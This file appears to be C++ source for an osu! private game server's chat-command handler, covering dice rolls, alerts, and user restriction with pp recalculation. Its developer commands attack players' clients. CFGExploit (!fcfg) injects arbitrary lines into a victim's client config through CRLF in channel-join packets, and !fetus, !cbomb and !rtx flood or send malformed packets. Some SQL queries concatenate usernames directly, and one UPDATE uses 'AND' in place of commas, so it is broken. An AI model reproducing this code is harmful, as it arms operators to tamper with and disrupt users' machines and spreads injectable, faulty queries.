#pragma once


#define Roll(u,input)\
	[&](const uint64_t Max)->const std::string{\
		return u->Username + " rolled " + std::to_string(BR::GetRand64(0, (Max) ? Max : 100));\
	}(input)

#define TRIMSTRING(str)\
	[](std::string &s)->std::string{\
		if(!s.size())return s;\
		for(DWORD ii = s.size()-1;ii>0;ii--){\
			if(s[ii] != ' ')break;\
			s.pop_back();\
		}\
		if(s[0] != ' ')return s;\
		DWORD Start = 0;\
		for(DWORD ii=0;ii<s.size();ii++)\
			if (s[ii] != ' ') {\
				Start=ii;\
				break;\
			}\
		if(Start == 0){s.resize(0);return s;}\
		const DWORD nSize = s.size() - Start;\
		memcpy(&s[0],&s[Start],nSize);s.resize(nSize);\
		return s;\
	}(str)

__forceinline bool Fetus(const std::string &Target) {

	if (Target.size() == 0)return 0;

	_User *u = GetUserFromNameSafe(Target);

	if (!u)return 0;

	const _BanchoPacket b = bPacket::Message("", "", "", 0);
	u->qLock.lock();
	for (DWORD i = 0; i < 16; i++)
		u->addQueNonLocking(b);
	u->qLock.unlock();
	return 1;
}


void ReplaceAll(std::string &str, const std::string& from, const std::string& to) {
	size_t start_pos = 0;
	while ((start_pos = str.find(from, start_pos)) != std::string::npos){
		str.replace(start_pos, from.length(), to);
		start_pos += to.length(); // Handles case where 'to' is a substring of 'from'
	}
}


std::string CFGExploit(const std::string &Target,std::string &NewCFGLine){

	_User * u = GetUserFromNameSafe(Target);
	if (!u)return "Could not find user";

	ReplaceAll(NewCFGLine, "\\n", "\n\n");
	u->qLock.lock();
	u->HyperMode = 1;
	u->addQueNonLocking(_BanchoPacket(OPac::server_getAttention));
	for(DWORD i=0;i<10;i++)
		u->addQueNonLocking(bPacket::GenericString(OPac::server_channelJoinSuccess, "# \r\n" + NewCFGLine + "\r\nChatChannels = #osu" + std::to_string(i)));

	u->addQueNonLocking(bPacket::Message("BanchoBot",Target,"Do fish blink",0));

	u->addQueDelayNonLocking(_DelayedBanchoPacket(1, bPacket::GenericString(OPac::server_channelKicked, "BanchoBot")));

	const _BanchoPacket fPacket = bPacket::Message("", "", "", 0);
	for(DWORD i=0;i<16;i++)
		u->addQueDelayNonLocking(_DelayedBanchoPacket(2, fPacket));
	u->qLock.unlock();

	return "Done.";
}
int getSetID_fHash(const std::string &H, _SQLCon* c);


bool IsBeatmapIDRanked(const DWORD ID, _SQLCon &SQL){

	if (!ID)return 0;


	sql::ResultSet *res = SQL.ExecuteQuery("SELECT ranked FROM beatmaps where beatmap_id = " + std::to_string(ID) + " LIMIT 1");

	if (!res)return 0;
	

	const bool Ret = !(!res || !res->next() || res->getInt(1) < 2);

	if (res) delete res;
	return Ret;
}

void RecalcSingleUserPP(const DWORD ID, _SQLCon &SQL){//This is relatively expensive. Obviously if there was an entire pp recalc a per beatmap solution would be much better (and will be made).
	
	if (!ID)return;
	
	//TODO add other modes
	ezpp_t ez = ezpp_new();

	const DWORD Mode = 0;

	{
		sql::ResultSet *res = SQL.ExecuteQuery("SELECT beatmap_md5,max_combo,mods,misses_count,accuracy,id FROM scores WHERE userid = " + std::to_string(ID) + " AND completed = 3 AND play_mode = " + std::to_string(Mode), 1);

		ezpp_set_mode(ez, Mode);

		while (res && res->next()) {

			const DWORD BeatmapID = getSetID_fHash(res->getString(1), &SQL);

			if (!IsBeatmapIDRanked(BeatmapID,SQL))continue;

			ezpp_set_combo(ez, res->getInt(2));
			ezpp_set_mods(ez, res->getInt(3));
			ezpp_set_nmiss(ez, res->getInt(4));
			ezpp_set_accuracy_percent(ez, res->getDouble(5));

			if (!OppaiCheckMapDownload(ez, BeatmapID))
				continue;

			const float PP = ezpp_pp(ez);

			SQL.ExecuteUPDATE("UPDATE scores SET pp = " + std::to_string(PP) + " WHERE id = " + std::to_string(res->getInt64(6)), 1);

		}if (res)delete res;

		_UserStats blank;
		blank.Acc = -1.f;
		blank.pp = -1;

		UpdateUserStatsFromDB(&SQL, ID, Mode, blank);
		printf("TotalEndPP: %i\n", blank.pp);		
	}

	ezpp_free(ez);


}

void unRestrictUser(_User* Caller, const std::string &UserName, DWORD ID) {

	if (!Caller || !(Caller->privileges & Privileges::AdminManageUsers) || (UserName.size() == 0 && !ID))
		return;

	_SQLCon SQL;

	const auto Respond = [&](const std::string& Mess)->void {
		SQL.Disconnect();
		return Caller->addQue(bPacket::BotMessage(Caller->Username, std::move(Mess)));
	};

	if (!SQL.Connect())
		return Respond("Could not connect to the SQL");

	DWORD BanPrivs = -1;

	if (!ID) {

		sql::ResultSet *res = SQL.ExecuteQuery("SELECT id, privileges FROM users WHERE username_safe = '" + UserName + "' LIMIT 1", 1);

		if (!res || !res->next()) {
			if (res)delete res;
			return Respond("Failed to find a user with that name");
		}
		ID = res->getInt(1);
		BanPrivs = res->getUInt(2);
		delete res;
	}
	if (BanPrivs == -1) {

		sql::ResultSet *res = SQL.ExecuteQuery("SELECT privileges FROM users WHERE id = " + std::to_string(ID) + " LIMIT 1", 1);

		if (!res || !res->next()) {
			if (res)delete res;
			return Respond("Failed to find a user with that ID");
		}
		BanPrivs = res->getUInt(1);
		delete res;
	}

	if(BanPrivs & Privileges::UserPublic)
		return Respond("They do not appear to be banned.");

	BanPrivs = BanPrivs | Privileges::UserPublic;
	SQL.ExecuteUPDATE("UPDATE users SET privileges = " + std::to_string(BanPrivs) + " WHERE id = " + std::to_string(ID), 1);

	printf("Doing Full PP recalc on %i\n", ID);
	const int sTime = clock();
	
	RecalcSingleUserPP(ID, SQL);

	printf("PP Recalc time: %i\n", clock() - sTime);

	return Respond("They have been unrestricted.");
}


void RestrictUser(_User* Caller, const std::string &UserName, DWORD ID){
	
	if (!Caller || !(Caller->privileges & Privileges::AdminManageUsers) || (UserName.size() == 0 && !ID))
		return;
	
	_SQLCon SQL;

	auto Respond = [&](const std::string& Mess)->void{
		SQL.Disconnect();
		return Caller->addQue(bPacket::BotMessage(Caller->Username,std::move(Mess)));
	};

	if (!SQL.Connect())
		return Respond("Could not connect to the SQL");

	DWORD BanPrivs = -1;

	if (!ID){

		sql::ResultSet *res = SQL.ExecuteQuery("SELECT id, privileges FROM users WHERE username_safe = '" + UserName + "' LIMIT 1",1);

		if (!res || !res->next()){
			if (res)delete res;
			return Respond("Failed to find a user with that name");
		}
		ID = res->getInt(1);
		BanPrivs = res->getUInt(2);
		delete res;
	}
	if (BanPrivs == -1){

		sql::ResultSet *res = SQL.ExecuteQuery("SELECT privileges FROM users WHERE id = " + std::to_string(ID) + " LIMIT 1",1);

		if (!res || !res->next()) {
			if (res)delete res;
			return Respond("Failed to find a user with that ID");
		}
		BanPrivs = res->getUInt(1);
		delete res;
	}

	if(BanPrivs & Privileges::AdminDev)
		return Respond("Developers can only be demoted directly through the SQL.");

	if(BanPrivs & Privileges::AdminManageUsers && !(Caller->privileges & Privileges::AdminDev) || ID < 1000)
		return Respond("You do not have the perms to restrict that user.");

	if (BanPrivs & Privileges::UserPublic){
		BanPrivs = Privileges::UserNormal | (BanPrivs & (Privileges::UserDonor | Privileges::Premium));//Evict them of any special standing, except donor perks.
		
		//These could be done in one. But im pretty sure its better for SQL to do multiple smaller commands than one large one.

		SQL.ExecuteUPDATE("UPDATE users SET privileges = " + std::to_string(BanPrivs) + " WHERE id = " + std::to_string(ID),1);
		SQL.ExecuteUPDATE("UPDATE scores SET pp = 0 WHERE completed = 3 AND userid = " + std::to_string(ID),1);
		SQL.ExecuteUPDATE("UPDATE scores_relax SET pp = 0 WHERE completed = 3 AND userid = " + std::to_string(ID),1);
		SQL.ExecuteUPDATE("UPDATE users_stats SET pp_std = 0 AND pp_taiko = 0 AND pp_ctb = 0 AND pp_mania = 0 WHERE id = " + std::to_string(ID), 1);
		SQL.ExecuteUPDATE("UPDATE rx_stats SET pp_std = 0 AND pp_taiko = 0 AND pp_ctb = 0 AND pp_mania = 0 WHERE id = " + std::to_string(ID), 1);


		for(DWORD i=0;i<8;i++)
			UpdateRank(ID, i, 1);

		_User* Banned = GetUserFromID(ID);
		//If the user is online reconnect them to update their new status :)
		if (Banned) {
			Banned->privileges = BanPrivs;
			Banned->choToken = 0;
		}
	}else return Respond("They already appear to be restricted.");
	
	return Respond("The deed is done.");
}


#define CombineAllNextSplit(INDEX)\
	[&]()->std::string{\
		if (Split.size() <= INDEX)return "";\
		if (Split.size() == INDEX + 1)return Split[INDEX];\
		std::string comString = Split[INDEX];\
		for (DWORD i = INDEX + 1; i < Split.size(); i++)\
			comString += " " + Split[i];\
		return comString;\
	}()

const std::string ProcessCommand(_User* u,const std::string &Command, DWORD &PrivateRes){

	const DWORD Priv = u->privileges;

	PrivateRes = 1;

	if (Command.size() == 0 || Command[0] != '!')
		return "";

	const auto Split = EXPLODE_VEC(std::string, Command, ' ');

	if (Split[0] == "!roll"){
		PrivateRes = 0;
		return Roll(u, (Split.size() > 1) ? StringToUInt64(Split[1]) : 100);
	}
	if (Split[0] == "!fetus"){

		if (!(Priv & Privileges::AdminDev))goto INSUFFICIENTPRIV;

		if(Fetus(USERNAMESAFE(CombineAllNextSplit(1))))return "deletus.";

		return "Not completus. That user does not exist.";
	}

	if (MEM_CMP_START(Split[0], "!alert")){

		if (!(Priv & Privileges::AdminDev))goto INSUFFICIENTPRIV;

		const bool TargetAll = (Split[0].size() == _strlen_("!alert"));

		const std::string Message = CombineAllNextSplit((TargetAll ? 1 : 2));

		if (Message.size() == 0)return "You can not alert nothing.";

		const _BanchoPacket b = bPacket::Notification(std::move(Message));

		if (TargetAll) {
			for (DWORD i = 0; i < MAX_USER_COUNT; i++)
				if (User[i].choToken)User[i].addQue(b);
		}else{
			_User*const Target = GetUserFromNameSafe(USERNAMESAFE(std::string(Split[1])));
			if (!Target || !Target->choToken)return "User not found.";
			Target->addQue(b);
		}
		return (TargetAll) ? "Alerted all online users." : "User has been alerted";
	}
	if (Split[0] == "!rtx"){

		if (!(Priv & Privileges::AdminDev))goto INSUFFICIENTPRIV;

		if (Split.size() < 2)return "No target given";

		_User *const Target = GetUserFromNameSafe(USERNAMESAFE(std::string(Split[1])));

		if (!Target || !Target->choToken)return "User not found.";

		Target->addQue(bPacket::GenericString(0x69, CombineAllNextSplit(2)));

		return "You monster.";
	}
	if (Split[0] == "!b"){

		if (!(Priv & Privileges::AdminDev))
			goto INSUFFICIENTPRIV;
		PrivateRes = 0;

		return CombineAllNextSplit(1);
	}
	if (Split[0] == "!priv")
		return std::to_string(Priv);

	if (Split[0] == "!fcfg"){

		if (!(Priv & Privileges::AdminDev))
			goto INSUFFICIENTPRIV;

		if (Split.size() > 2)
			return CFGExploit(USERNAMESAFE(std::string(Split[1])), CombineAllNextSplit(2));

		return "!fcfg <username> <config lines>";
	}

	if (MEM_CMP_START(Split[0], "!restrict")) {

		if (!(Priv & Privileges::AdminManageUsers))goto INSUFFICIENTPRIV;

		if (Split.size() < 3)return "!restrict(id) <name / id> <reason>";
		

		const bool RestrictWithName = (Split[0].size() == _strlen_("!restrict"));
		const std::string RestrictName = (RestrictWithName) ? REMOVEQUOTES(USERNAMESAFE(std::string(Split[1]))) : "";
		const DWORD RestrictID = (!RestrictWithName) ? StringToUInt32(Split[1]) : 0;
		
		{
			std::thread t(RestrictUser, u, std::move(RestrictName), RestrictID);
			t.detach();
		}

		return "";
	}
	if (MEM_CMP_START(Split[0], "!unrestrict")) {

		if (!(Priv & Privileges::AdminManageUsers))goto INSUFFICIENTPRIV;

		if (Split.size() < 3)return "!unrestrict(id) <name / id> <reason>";


		const bool RestrictWithName = (Split[0].size() == _strlen_("!unrestrict"));
		const std::string RestrictName = (RestrictWithName) ? REMOVEQUOTES(USERNAMESAFE(std::string(Split[1]))) : "";
		const DWORD RestrictID = (!RestrictWithName) ? StringToUInt32(Split[1]) : 0;

		{
			std::thread t(unRestrictUser, u, std::move(RestrictName), RestrictID);
			t.detach();
		}

		return "";
	}

	if (Split[0] == "!cbomb") {

		if (!(Priv & Privileges::AdminDev) || Split.size() != 3)
			goto INSUFFICIENTPRIV;

		_User *t = GetUserFromNameSafe(USERNAMESAFE(std::string(Split[1])));

		if (t){

			const USHORT Count = USHORT(StringToInt32(Split[2]));

			t->qLock.lock();

			for (USHORT i = 0; i < Count; i++)
				t->addQueNonLocking(bPacket::GenericString(OPac::server_channelJoinSuccess, "#" + std::to_string(i)));

			t->qLock.unlock();

		}

		return "okay";
	}
	if (Split[0] == "!setpp") {

		if (!(Priv & Privileges::AdminDev) || Split.size() != 2)
			goto INSUFFICIENTPRIV;
		
		u->Stats[0].pp = StringToUInt32(Split[1]);

		UpdateRank(u->UserID, 0, u->Stats[0].pp);

		return "Set";
	}
	
	if (Split[0] == "!reconnect"){
		u->choToken = GenerateChoToken();
		return "";
	}

	//search hard coded commands

	//command look up table search loaded from script files

	return "That is not a command.";
INSUFFICIENTPRIV:return "You are not allowed to use that command.";

}